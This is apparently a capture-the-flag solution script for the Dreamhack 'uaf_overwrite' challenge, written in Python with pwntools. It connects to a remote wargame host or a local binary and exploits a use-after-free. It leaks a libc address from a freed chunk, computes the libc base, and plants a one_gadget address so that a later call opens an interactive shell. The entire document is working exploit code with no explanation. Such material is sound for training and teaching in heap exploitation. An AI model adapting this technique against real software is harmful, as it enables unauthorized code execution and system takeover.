#!/usr/bin/env python3

from pwn import *

exe = ELF("./uaf_overwrite_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 24215)

    return r

r = conn()

def human(weight, age):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(weight).encode())
    r.sendlineafter(b": ", str(age).encode())

def robot(weight):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", str(weight).encode())

def custom(size, data, idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", str(size).encode())
    r.sendafter(b": ", data)
    r.sendlineafter(b": ", str(idx).encode())

def main():

    custom(1296, b"\x00", -1)
    custom(1296, b"\x00", 0)
    custom(1296, b"A", -1)

    libc_base = u64(r.recvline()[:-1].ljust(8, b"\x00")) - 0x3ebc41
    one_gadget = libc_base + 0x10a41c

    human(1, one_gadget)
    robot(1)

    r.interactive()


if __name__ == "__main__":
    main()
